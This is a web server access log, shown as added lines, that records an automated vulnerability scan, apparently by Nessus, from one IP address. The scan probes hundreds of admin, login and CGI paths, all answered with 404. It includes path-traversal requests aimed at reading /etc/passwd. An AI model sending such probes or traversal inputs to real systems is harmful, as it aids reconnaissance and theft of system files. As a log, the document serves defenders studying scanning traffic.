+Not Found: /rcladmin/js/art_i18n/nls/art_i18n.js
+[08/Oct/2023 04:35:08] "GET /rcladmin/js/art_i18n/nls/art_i18n.js HTTP/1.1" 404 5391
+[08/Oct/2023 04:35:08,752] - Broken pipe from ('130.253.1.147', 56702)
+
+[08/Oct/2023 04:35:08,756] - Broken pipe from ('130.253.1.147', 56982)
+
+[08/Oct/2023 04:35:08] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:08] "GET / HTTP/1.1" 200 35341
+Not Found: /rdweb/login/login.html
+[08/Oct/2023 04:35:08] "GET /rdweb/login/login.html HTTP/1.1" 404 5349
+Not Found: /ibmmq/console/login.html
+[08/Oct/2023 04:35:08] "GET /ibmmq/console/login.html HTTP/1.1" 404 5355
+[08/Oct/2023 04:35:09,115] - Broken pipe from ('130.253.1.147', 57124)
+
+Not Found: /ibmmq/console/nls/en/strings.json
+[08/Oct/2023 04:35:09] "GET /ibmmq/console/nls/en/strings.json HTTP/1.1" 404 5382
+[08/Oct/2023 04:35:09] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:09,391] - Broken pipe from ('130.253.1.147', 57158)
+
+[08/Oct/2023 04:35:09] "GET / HTTP/1.1" 200 35341
+Not Found: /jts/
+[08/Oct/2023 04:35:09] "GET /jts/ HTTP/1.1" 404 5295
+[08/Oct/2023 04:35:09,615] - Broken pipe from ('130.253.1.147', 57610)
+
+Not Found: /dp/login.xml
+[08/Oct/2023 04:35:09] "GET /dp/login.xml HTTP/1.1" 404 5319
+[08/Oct/2023 04:35:09] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:09,699] - Broken pipe from ('130.253.1.147', 57710)
+
+Not Found: /albatross/A3Suite
+[08/Oct/2023 04:35:09] "GET /albatross/A3Suite HTTP/1.1" 404 5334
+[08/Oct/2023 04:35:09] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:09,901] - Broken pipe from ('130.253.1.147', 57928)
+
+[08/Oct/2023 04:35:10] "GET / HTTP/1.1" 200 35341
+Not Found: /shared/userlogin.php
+[08/Oct/2023 04:35:10] "GET /shared/userlogin.php HTTP/1.1" 404 5343
+[08/Oct/2023 04:35:10] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:10,365] - Broken pipe from ('130.253.1.147', 58122)
+
+[08/Oct/2023 04:35:10] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:10,527] - Broken pipe from ('130.253.1.147', 58338)
+
+Not Found: /trc
+[08/Oct/2023 04:35:10] "GET /trc HTTP/1.1" 404 5292
+[08/Oct/2023 04:35:10] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:10,570] - Broken pipe from ('130.253.1.147', 58874)
+
+[08/Oct/2023 04:35:10] "GET / HTTP/1.1" 200 35341
+Not Found: /aspera/faspex/login/new
+[08/Oct/2023 04:35:10] "GET /aspera/faspex/login/new?local=true HTTP/1.1" 404 5363
+[08/Oct/2023 04:35:10,815] - Broken pipe from ('130.253.1.147', 58934)
+
+Not Found: /../../../../../../../etc/passwd
+[08/Oct/2023 04:35:10] "GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 404 5349
+Not Found: /~nobody/etc/passwd
+[08/Oct/2023 04:35:10] "GET /~nobody/etc/passwd HTTP/1.1" 404 5337
+[08/Oct/2023 04:35:11,196] - Broken pipe from ('130.253.1.147', 58968)
+
+[08/Oct/2023 04:35:11] "HEAD / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:11] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:11] code 505, message Invalid HTTP version (2.0)
+[08/Oct/2023 04:35:11] "PRI * HTTP/2.0" 505 -
+Not Found: /admin.cgi
+[08/Oct/2023 04:35:11] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:11] "GET /admin.cgi HTTP/1.1" 404 5310
+[08/Oct/2023 04:35:11] "GET // HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:11,711] - Broken pipe from ('130.253.1.147', 59560)
+
+[08/Oct/2023 04:35:11] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:11] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:12,237] - Broken pipe from ('130.253.1.147', 59802)
+
+Not Found: /js/hpsum/hpsum-version.js
+[08/Oct/2023 04:35:12] "GET /js/hpsum/hpsum-version.js HTTP/1.1" 404 5358
+[08/Oct/2023 04:35:12] "GET / HTTP/1.1" 200 35341
+Not Found: /js/hpsum/hpsum-version.js
+[08/Oct/2023 04:35:12] "GET /js/hpsum/hpsum-version.js HTTP/1.1" 404 5358
+Not Found: /SiteScope/
+Not Found: /js/hpsum/hpsum-version.js
+[08/Oct/2023 04:35:12] "GET /SiteScope/ HTTP/1.1" 404 5313
+[08/Oct/2023 04:35:12] "GET /js/hpsum/hpsum-version.js HTTP/1.1" 404 5358
+[08/Oct/2023 04:35:12,793] - Broken pipe from ('130.253.1.147', 60728)
+
+Not Found: /js/hpsum/hpsum-version.js
+[08/Oct/2023 04:35:12] "GET /js/hpsum/hpsum-version.js HTTP/1.1" 404 5358
+[08/Oct/2023 04:35:12] "GET / HTTP/1.1" 200 35341
+Not Found: /js/hpsum/hpsum-version.js
+[08/Oct/2023 04:35:12] "GET /js/hpsum/hpsum-version.js HTTP/1.1" 404 5358
+Not Found: /oo/
+[08/Oct/2023 04:35:12] "GET /oo/ HTTP/1.1" 404 5292
+[08/Oct/2023 04:35:12,977] - Broken pipe from ('130.253.1.147', 60308)
+
+[08/Oct/2023 04:35:13] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:13,121] - Broken pipe from ('130.253.1.147', 32868)
+
+[08/Oct/2023 04:35:13] "GET / HTTP/1.1" 200 35341
+Not Found: /xmldata
+[08/Oct/2023 04:35:13] "GET /xmldata?item=all HTTP/1.1" 404 5313
+[08/Oct/2023 04:35:13,394] - Broken pipe from ('130.253.1.147', 33162)
+
+Not Found: /nnm/main
+[08/Oct/2023 04:35:13] "GET /nnm/main HTTP/1.1" 404 5307
+[08/Oct/2023 04:35:13,558] - Broken pipe from ('130.253.1.147', 33342)
+
+[08/Oct/2023 04:35:13] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:13] "GET / HTTP/1.1" 200 35341
+Not Found: /imc
+[08/Oct/2023 04:35:13] "GET /imc HTTP/1.1" 404 5292
+Not Found: /autopass/login_input
+[08/Oct/2023 04:35:13] "GET /autopass/login_input HTTP/1.1" 404 5343
+[08/Oct/2023 04:35:13,970] - Broken pipe from ('130.253.1.147', 33590)
+
+[08/Oct/2023 04:35:14] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:14,133] - Broken pipe from ('130.253.1.147', 33632)
+
+[08/Oct/2023 04:35:14] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:14] "GET / HTTP/1.1" 200 35341
+Not Found: /hazelcast/rest/cluster
+[08/Oct/2023 04:35:14] "GET /hazelcast/rest/cluster HTTP/1.1" 404 5349
+[08/Oct/2023 04:35:14,386] - Broken pipe from ('130.253.1.147', 34132)
+
+[08/Oct/2023 04:35:14,389] - Broken pipe from ('130.253.1.147', 34082)
+
+[08/Oct/2023 04:35:14] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:14] "GET / HTTP/1.1" 200 35341
+Not Found: /public/
+Not Found: /com/novell/webaccess/WebAccessUninstall.ini
+[08/Oct/2023 04:35:14] "GET /public/ HTTP/1.1" 404 5304
+[08/Oct/2023 04:35:14] "GET /com/novell/webaccess/WebAccessUninstall.ini HTTP/1.1" 404 5412
+[08/Oct/2023 04:35:14,788] - Broken pipe from ('130.253.1.147', 34404)
+
+[08/Oct/2023 04:35:14,805] - Broken pipe from ('130.253.1.147', 34410)
+
+[08/Oct/2023 04:35:14] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:14] "GET / HTTP/1.1" 200 35341
+Not Found: /servlet/webacc
+Not Found: /portal
+[08/Oct/2023 04:35:15] "GET /servlet/webacc?error=webacc HTTP/1.1" 404 5338
+[08/Oct/2023 04:35:15] "GET /portal HTTP/1.1" 404 5301
+[08/Oct/2023 04:35:15,826] - Broken pipe from ('130.253.1.147', 34768)
+
+[08/Oct/2023 04:35:15,827] - Broken pipe from ('130.253.1.147', 34770)
+
+[08/Oct/2023 04:35:15] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:15] "GET / HTTP/1.1" 200 35341
+Not Found: /login
+[08/Oct/2023 04:35:16] "GET /login HTTP/1.1" 404 5298
+Not Found: /login
+[08/Oct/2023 04:35:16] "GET /login HTTP/1.1" 404 5298
+[08/Oct/2023 04:35:16,765] - Broken pipe from ('130.253.1.147', 35782)
+
+Not Found: /administrator.cgi
+[08/Oct/2023 04:35:16] "GET /administrator.cgi HTTP/1.1" 404 5334
+[08/Oct/2023 04:35:16,801] - Broken pipe from ('130.253.1.147', 35840)
+
+[08/Oct/2023 04:35:16] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:17] "GET / HTTP/1.1" 200 35341
+Not Found: /users/sign_in
+[08/Oct/2023 04:35:17] "GET /users/sign_in HTTP/1.1" 404 5322
+[08/Oct/2023 04:35:17] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:17,592] - Broken pipe from ('130.253.1.147', 36812)
+
+[08/Oct/2023 04:35:17,747] - Broken pipe from ('130.253.1.147', 36660)
+
+[08/Oct/2023 04:35:17] "GET / HTTP/1.1" 200 35341
+Not Found: /WEB-INF./web.xml
+[08/Oct/2023 04:35:17] "GET /WEB-INF./web.xml HTTP/1.1" 404 5325
+[08/Oct/2023 04:35:17] "GET / HTTP/1.1" 200 35341
+Not Found: /setup
+[08/Oct/2023 04:35:17] "GET /setup HTTP/1.1" 404 5298
+[08/Oct/2023 04:35:18,002] - Broken pipe from ('130.253.1.147', 37574)
+
+Not Found: /ews/index.htm
+[08/Oct/2023 04:35:18] "GET /ews/index.htm HTTP/1.1" 404 5322
+[08/Oct/2023 04:35:18,156] - Broken pipe from ('130.253.1.147', 37732)
+
+[08/Oct/2023 04:35:18] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:18] "GET / HTTP/1.1" 200 35341
+Not Found: /_vti_bin/fpcount.exe
+Not Found: /_vti_bin/shtml.dll/_vti_rpc
+[08/Oct/2023 04:35:18] "GET /_vti_bin/shtml.dll/_vti_rpc HTTP/1.1" 404 5364
+[08/Oct/2023 04:35:18] "GET /_vti_bin/fpcount.exe HTTP/1.1" 404 5343
+[08/Oct/2023 04:35:18,308] - Broken pipe from ('130.253.1.147', 38074)
+
+[08/Oct/2023 04:35:18,308] - Broken pipe from ('130.253.1.147', 38076)
+
+[08/Oct/2023 04:35:18] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:18] "GET / HTTP/1.1" 200 35341
+Not Found: /gui/i18n/messages.en.json
+Not Found: /goanywhere/auth/Login.xhtml
+[08/Oct/2023 04:35:18] "GET /gui/i18n/messages.en.json HTTP/1.1" 404 5358
+[08/Oct/2023 04:35:18] "GET /goanywhere/auth/Login.xhtml HTTP/1.1" 404 5364
+[08/Oct/2023 04:35:18,892] - Broken pipe from ('130.253.1.147', 38306)
+
+[08/Oct/2023 04:35:18,892] - Broken pipe from ('130.253.1.147', 38314)
+
+[08/Oct/2023 04:35:18] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:18] "GET / HTTP/1.1" 200 35341
+Not Found: /system/console
+Not Found: /f360/login.jsp
+[08/Oct/2023 04:35:19] "GET /f360/login.jsp HTTP/1.1" 404 5325
+[08/Oct/2023 04:35:19] "GET /system/console?version=1.5 HTTP/1.1" 404 5337
+Not Found: /images/login_top.gif
+Not Found: /login.jsp
+[08/Oct/2023 04:35:19] "GET /images/login_top.gif HTTP/1.1" 404 5343
+[08/Oct/2023 04:35:19] "GET //login.jsp HTTP/1.1" 404 5310
+[08/Oct/2023 04:35:19,106] - Broken pipe from ('130.253.1.147', 38760)
+
+Not Found: /images/logon_merge.gif
+[08/Oct/2023 04:35:19] "GET /images/logon_merge.gif HTTP/1.1" 404 5349
+[08/Oct/2023 04:35:19] "GET / HTTP/1.1" 200 35341
+Not Found: /login
+[08/Oct/2023 04:35:19] "GET /login HTTP/1.1" 404 5298
+Not Found: /login/
+[08/Oct/2023 04:35:19] "GET /login/ HTTP/1.1" 404 5301
+Not Found: /431cb5237001e73e794398e4fa3cf660/css/main-green.css
+[08/Oct/2023 04:35:19] "GET /431cb5237001e73e794398e4fa3cf660/css/main-green.css HTTP/1.1" 404 5436
+[08/Oct/2023 04:35:19,362] - Broken pipe from ('130.253.1.147', 38968)
+
+Not Found: /robots.txt
+[08/Oct/2023 04:35:19] "GET /robots.txt HTTP/1.1" 404 5313
+[08/Oct/2023 04:35:19,749] - Broken pipe from ('130.253.1.147', 38758)
+
+Not Found: /niet507599392.
+[08/Oct/2023 04:35:20] "GET /niet507599392. HTTP/1.1" 404 5325
+Not Found: /buglist.cgi
+[08/Oct/2023 04:35:22] "GET /buglist.cgi HTTP/1.1" 404 5316
+[08/Oct/2023 04:35:24] "GET / HTTP/1.1" 200 35341
+Not Found: /features
+[08/Oct/2023 04:35:24] "GET /features HTTP/1.1" 404 5307
+[08/Oct/2023 04:35:24,593] - Broken pipe from ('130.253.1.147', 44628)
+
+[08/Oct/2023 04:35:24] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:24] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:35:24,899] - Broken pipe from ('130.253.1.147', 44900)
+
+[08/Oct/2023 04:35:24] "GET / HTTP/1.1" 200 35341
+Not Found: /login/login
+[08/Oct/2023 04:35:25] "GET //login/login HTTP/1.1" 404 5316
+[08/Oct/2023 04:35:25,143] - Broken pipe from ('130.253.1.147', 45140)
+
+[08/Oct/2023 04:35:25] "GET / HTTP/1.1" 200 35341
+Not Found: /fpui/jsp/login.jsp
+[08/Oct/2023 04:35:25] "GET /fpui/jsp/login.jsp HTTP/1.1" 404 5337
+[08/Oct/2023 04:35:25,331] - Broken pipe from ('130.253.1.147', 45358)
+
+[08/Oct/2023 04:35:25] "GET / HTTP/1.1" 200 35341
+Not Found: /acopia/
+[08/Oct/2023 04:35:25] "GET /acopia/ HTTP/1.1" 404 5304
+[08/Oct/2023 04:35:25,670] - Broken pipe from ('130.253.1.147', 45690)
+
+[08/Oct/2023 04:35:25] "GET / HTTP/1.1" 200 35341
+Not Found: /ui/login/
+[08/Oct/2023 04:35:26] "GET /ui/login/ HTTP/1.1" 404 5310
+[08/Oct/2023 04:35:26,253] - Broken pipe from ('130.253.1.147', 45972)
+
+Not Found: /cgi/mid.cgi
+[08/Oct/2023 04:35:27] "GET /cgi/mid.cgi HTTP/1.1" 404 5316
+Not Found: /cgi-bin/admin
+[08/Oct/2023 04:35:32] "GET /cgi-bin/admin HTTP/1.1" 404 5322
+Not Found: /niet61689493.asp
+[08/Oct/2023 04:35:34] "GET /niet61689493.asp HTTP/1.1" 404 5331
+Not Found: /cgi-bin/admin.cgi
+[08/Oct/2023 04:35:38] "GET /cgi-bin/admin.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-bin/admin.pl
+[08/Oct/2023 04:35:44] "GET /cgi-bin/admin.pl HTTP/1.1" 404 5331
+Not Found: /cgi-bin/administrator
+[08/Oct/2023 04:35:49] "GET /cgi-bin/administrator HTTP/1.1" 404 5346
+Not Found: /cgi-bin/administrator.cgi
+[08/Oct/2023 04:35:55] "GET /cgi-bin/administrator.cgi HTTP/1.1" 404 5358
+Not Found: /cgi-bin/agorn.cgi
+[08/Oct/2023 04:36:01] "GET /cgi-bin/agorn.cgi HTTP/1.1" 404 5334
+Not Found: /niet1546378062.aspx
+[08/Oct/2023 04:36:01] "GET /niet1546378062.aspx HTTP/1.1" 404 5340
+Not Found: /cgi-bin/bugreport.cgi
+[08/Oct/2023 04:36:06] "GET /cgi-bin/bugreport.cgi HTTP/1.1" 404 5346
+Not Found: /cgi-bin/cart.cgi
+[08/Oct/2023 04:36:12] "GET /cgi-bin/cart.cgi HTTP/1.1" 404 5331
+Not Found: /cgi-bin/clwarn.cgi
+[08/Oct/2023 04:36:18] "GET /cgi-bin/clwarn.cgi HTTP/1.1" 404 5337
+Not Found: /cgi-bin/count.cgi
+[08/Oct/2023 04:36:24] "GET /cgi-bin/count.cgi HTTP/1.1" 404 5334
+Not Found: /niet1158774411.html
+[08/Oct/2023 04:36:27] "GET /niet1158774411.html HTTP/1.1" 404 5340
+Not Found: /cgi-bin/Count.cgi
+[08/Oct/2023 04:36:29] "GET /cgi-bin/Count.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-bin/faqmanager.cgi
+[08/Oct/2023 04:36:35] "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 404 5349
+Not Found: /cgi-bin/FormHandler.cgi
+[08/Oct/2023 04:36:40] "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 5352
+Not Found: /cgi-bin/FormMail.cgi
+[08/Oct/2023 04:36:46] "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 5343
+Not Found: /cgi-bin/guestbook.cgi
+[08/Oct/2023 04:36:52] "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 5346
+Not Found: /cgi-bin/help.cgi
+[08/Oct/2023 04:36:58] "GET /cgi-bin/help.cgi HTTP/1.1" 404 5331
+Not Found: /niet1754195203.htm
+[08/Oct/2023 04:36:58] "GET /niet1754195203.htm HTTP/1.1" 404 5337
+Not Found: /cgi-bin/hi
+[08/Oct/2023 04:37:03] "GET /cgi-bin/hi HTTP/1.1" 404 5313
+Not Found: /cgi-bin/index.cgi
+[08/Oct/2023 04:37:08] "GET /cgi-bin/index.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-bin/index.pl
+[08/Oct/2023 04:37:14] "GET /cgi-bin/index.pl HTTP/1.1" 404 5331
+Not Found: /cgi-bin/index.sh
+[08/Oct/2023 04:37:20] "GET /cgi-bin/index.sh HTTP/1.1" 404 5331
+Not Found: /cgi-bin/login.cgi
+[08/Oct/2023 04:37:26] "GET /cgi-bin/login.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-bin/mailit.pl
+[08/Oct/2023 04:37:32] "GET /cgi-bin/mailit.pl HTTP/1.1" 404 5334
+Not Found: /niet67743329.shtm
+[08/Oct/2023 04:37:34] "GET /niet67743329.shtm HTTP/1.1" 404 5334
+Not Found: /cgi-bin/mt/mt-check.cgi
+[08/Oct/2023 04:37:38] "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 5352
+Not Found: /cgi-bin/mt/mt-load.cgi
+[08/Oct/2023 04:37:43] "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 5349
+Not Found: /cgi-bin/mt-static/mt-check.cgi
+[08/Oct/2023 04:37:49] "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 5373
+Not Found: /cgi-bin/mt-static/mt-load.cgi
+[08/Oct/2023 04:37:54] "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 5370
+Not Found: /cgi-bin/ncbook/book.cgi
+[08/Oct/2023 04:38:00] "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 5352
+Not Found: /cgi-bin/printenv
+[08/Oct/2023 04:38:05] "GET /cgi-bin/printenv HTTP/1.1" 404 5331
+Not Found: /niet239159914.shtml
+[08/Oct/2023 04:38:05] "GET /niet239159914.shtml HTTP/1.1" 404 5340
+Not Found: /cgi-bin/printenv.cgi
+[08/Oct/2023 04:38:11] "GET /cgi-bin/printenv.cgi HTTP/1.1" 404 5343
+Not Found: /cgi-bin/quickstore.cgi
+[08/Oct/2023 04:38:17] "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 5349
+Not Found: /cgi-bin/search
+[08/Oct/2023 04:38:22] "GET /cgi-bin/search HTTP/1.1" 404 5325
+Not Found: /cgi-bin/search.cgi
+[08/Oct/2023 04:38:28] "GET /cgi-bin/search.cgi HTTP/1.1" 404 5337
+Not Found: /cgi-bin/search/search.cgi
+[08/Oct/2023 04:38:34] "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 5358
+Not Found: /cgi-bin/status
+[08/Oct/2023 04:38:39] "GET /cgi-bin/status HTTP/1.1" 404 5325
+Not Found: /niet1754295672.jsp
+[08/Oct/2023 04:38:41] "GET /niet1754295672.jsp HTTP/1.1" 404 5337
+Not Found: /cgi-bin/status.cgi
+[08/Oct/2023 04:38:45] "GET /cgi-bin/status.cgi HTTP/1.1" 404 5337
+Not Found: /cgi-bin/test.cgi
+[08/Oct/2023 04:38:51] "GET /cgi-bin/test.cgi HTTP/1.1" 404 5331
+Not Found: /cgi-bin/test.sh
+[08/Oct/2023 04:38:57] "GET /cgi-bin/test.sh HTTP/1.1" 404 5328
+Not Found: /cgi-bin/test-cgi
+[08/Oct/2023 04:39:02] "GET /cgi-bin/test-cgi HTTP/1.1" 404 5331
+Not Found: /niet281503720.jspx
+[08/Oct/2023 04:39:08] "GET /niet281503720.jspx HTTP/1.1" 404 5337
+Not Found: /cgi-bin/upload.cgi
+[08/Oct/2023 04:39:08] "GET /cgi-bin/upload.cgi HTTP/1.1" 404 5337
+Not Found: /cgi-bin/urlcount.cgi
+[08/Oct/2023 04:39:13] "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 5343
+Not Found: /cgi-bin/viewcvs.cgi
+[08/Oct/2023 04:39:19] "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 5340
+Not Found: /cgi-bin/wa
+[08/Oct/2023 04:39:24] "GET /cgi-bin/wa HTTP/1.1" 404 5313
+Not Found: /cgi-bin/wa.cgi
+[08/Oct/2023 04:39:30] "GET /cgi-bin/wa.cgi HTTP/1.1" 404 5325
+Not Found: /niet997523324.php
+[08/Oct/2023 04:39:31] "GET /niet997523324.php HTTP/1.1" 404 5334
+Not Found: /cgi-bin/wa.exe
+[08/Oct/2023 04:39:36] "GET /cgi-bin/wa.exe HTTP/1.1" 404 5325
+Not Found: /cgi-bin/whois.cgi
+[08/Oct/2023 04:39:43] "GET /cgi-bin/whois.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-bin-sdb/printenv
+[08/Oct/2023 04:39:49] "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 5343
+Not Found: /cgi-mod/index.cgi
+[08/Oct/2023 04:39:55] "GET /cgi-mod/index.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-sys/defaultwebpage.cgi
+[08/Oct/2023 04:40:00] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 5361
+Not Found: /cgi-sys/entropysearch.cgi
+[08/Oct/2023 04:40:06] "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 5358
+Not Found: /niet1284277606.php3
+[08/Oct/2023 04:40:07] "GET /niet1284277606.php3 HTTP/1.1" 404 5340
+Not Found: /index.cgi
+[08/Oct/2023 04:40:11] "GET /index.cgi HTTP/1.1" 404 5310
+Not Found: /index.pl
+[08/Oct/2023 04:40:17] "GET /index.pl HTTP/1.1" 404 5307
+Not Found: /index.sh
+[08/Oct/2023 04:40:22] "GET /index.sh HTTP/1.1" 404 5307
+[08/Oct/2023 04:40:25,092] - Broken pipe from ('130.253.1.147', 53646)
+
+[08/Oct/2023 04:40:25] "GET / HTTP/1.1" 200 35341
+Not Found: /cgi-bin/com5.pl
+[08/Oct/2023 04:40:26] "GET /cgi-bin/com5.pl HTTP/1.1" 404 5328
+[08/Oct/2023 04:40:27,132] - Broken pipe from ('130.253.1.147', 34744)
+
+Not Found: /nph-mr.cgi
+[08/Oct/2023 04:40:28] "GET /nph-mr.cgi HTTP/1.1" 404 5313
+Not Found: /query.cgi
+[08/Oct/2023 04:40:34] "GET /query.cgi HTTP/1.1" 404 5310
+Not Found: /session_login.cgi
+[08/Oct/2023 04:40:39] "GET /session_login.cgi HTTP/1.1" 404 5334
+Not Found: /show_bug.cgi
+[08/Oct/2023 04:40:45] "GET /show_bug.cgi HTTP/1.1" 404 5319
+Not Found: /test
+[08/Oct/2023 04:40:50] "GET /test HTTP/1.1" 404 5295
+Not Found: /test.cgi
+[08/Oct/2023 04:40:56] "GET /test.cgi HTTP/1.1" 404 5307
+Not Found: /ucsm/isSamInstalled.cgi
+[08/Oct/2023 04:41:01] "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 5352
+Not Found: /whois.cgi
+[08/Oct/2023 04:41:07] "GET /whois.cgi HTTP/1.1" 404 5310
+Not Found: /wp-login.php
+[08/Oct/2023 04:41:12] "GET /wp-login.php HTTP/1.1" 404 5319
+Not Found: /wwwadmin.cgi
+[08/Oct/2023 04:41:18] "GET /wwwadmin.cgi HTTP/1.1" 404 5319
+Not Found: /wwwboard.cgi
+[08/Oct/2023 04:41:24] "GET /wwwboard.cgi HTTP/1.1" 404 5319
+Not Found: /xampp/cgi.cgi
+[08/Oct/2023 04:41:29] "GET /xampp/cgi.cgi HTTP/1.1" 404 5322
+[08/Oct/2023 04:41:35,029] - Broken pipe from ('130.253.1.147', 48684)
+
+[08/Oct/2023 04:46:50] "GET / HTTP/1.1" 200 35341
+Not Found: /eonapi/getAuthenticationStatus
+[08/Oct/2023 04:46:50] "GET /eonapi/getAuthenticationStatus HTTP/1.1" 404 5373
+[08/Oct/2023 04:46:50,977] - Broken pipe from ('130.253.1.147', 36992)
+
+[08/Oct/2023 04:46:50] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:51] "GET / HTTP/1.1" 200 35341
+Not Found: /login.web
+[08/Oct/2023 04:46:51] "GET /login.web HTTP/1.1" 404 5310
+[08/Oct/2023 04:46:51,306] - Broken pipe from ('130.253.1.147', 37048)
+
+[08/Oct/2023 04:46:51] "GET /? HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:51] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:51,559] - Broken pipe from ('130.253.1.147', 37052)
+
+Not Found: /spipe
+[08/Oct/2023 04:46:51] "POST /spipe?Source=nessus HTTP/1.0" 404 5313
+[08/Oct/2023 04:46:51] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:51] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:52,013] - Broken pipe from ('130.253.1.147', 37132)
+
+[08/Oct/2023 04:46:52] "GET / HTTP/1.1" 200 35341
+Not Found: /PUBLIC/ADMIN/INDEX.HTM
+[08/Oct/2023 04:46:52] "GET /PUBLIC/ADMIN/INDEX.HTM HTTP/1.1" 404 5349
+[08/Oct/2023 04:46:52,258] - Broken pipe from ('130.253.1.147', 37194)
+
+Not Found: /SE/appInfo.xml
+[08/Oct/2023 04:46:52] "GET /SE/appInfo.xml HTTP/1.1" 404 5325
+[08/Oct/2023 04:46:52] "GET / HTTP/1.1" 200 35341
+Not Found: /SE/EMC_SE.swf
+[08/Oct/2023 04:46:52] "GET /SE/EMC_SE.swf HTTP/1.1" 404 5322
+Not Found: /RSAarcher/Default.aspx
+[08/Oct/2023 04:46:52] "GET /RSAarcher/Default.aspx HTTP/1.1" 404 5349
+Not Found: /SE/EMC_SE.swf
+[08/Oct/2023 04:46:52] "GET /SE/EMC_SE.swf HTTP/1.1" 404 5322
+[08/Oct/2023 04:46:52,451] - Broken pipe from ('130.253.1.147', 37238)
+
+Not Found: /dtlt/home.html
+[08/Oct/2023 04:46:52] "GET /dtlt/home.html HTTP/1.1" 404 5325
+Not Found: /RSAarcher/Default.asp
+[08/Oct/2023 04:46:52] "GET /RSAarcher/Default.asp HTTP/1.1" 404 5346
+[08/Oct/2023 04:46:52,606] - Broken pipe from ('130.253.1.147', 37264)
+
+[08/Oct/2023 04:46:52,606] - Broken pipe from ('130.253.1.147', 37300)
+
+[08/Oct/2023 04:46:53] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:53] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:53] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:53] "GET / HTTP/1.1" 200 35341
+Not Found: /web/
+[08/Oct/2023 04:46:53] "GET /web/ HTTP/1.1" 404 5295
+Not Found: /DIj17xDt.ashx
+[08/Oct/2023 04:46:53] "GET /DIj17xDt.ashx HTTP/1.1" 404 5322
+Not Found: /cgi-bin/mainfunction.cgi
+[08/Oct/2023 04:46:53] "POST /cgi-bin/mainfunction.cgi HTTP/1.1" 404 5356
+Not Found: /Bw9TYkDA.ashx
+[08/Oct/2023 04:46:53] "GET /Bw9TYkDA.ashx HTTP/1.1" 404 5322
+[08/Oct/2023 04:46:53,478] - Broken pipe from ('130.253.1.147', 37504)
+
+[08/Oct/2023 04:46:53,478] - Broken pipe from ('130.253.1.147', 37500)
+
+Not Found: /IOqirQJT.aspx
+Not Found: /CM9KoHbW.aspx
+[08/Oct/2023 04:46:53] "GET /IOqirQJT.aspx HTTP/1.1" 404 5322
+[08/Oct/2023 04:46:53] "GET /CM9KoHbW.aspx HTTP/1.1" 404 5322
+[08/Oct/2023 04:46:53] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:53] "GET / HTTP/1.1" 200 35341
+Not Found: /K_oj4s2Z.asmx
+[08/Oct/2023 04:46:53] "GET /K_oj4s2Z.asmx HTTP/1.1" 404 5322
+Not Found: /d4vP82vB.asmx
+[08/Oct/2023 04:46:53] "GET /d4vP82vB.asmx HTTP/1.1" 404 5322
+Not Found: /syslog.htm
+[08/Oct/2023 04:46:53] "GET /syslog.htm HTTP/1.1" 404 5313
+Not Found: /probe/probeInfo
+[08/Oct/2023 04:46:53] "GET /probe/probeInfo HTTP/1.1" 404 5328
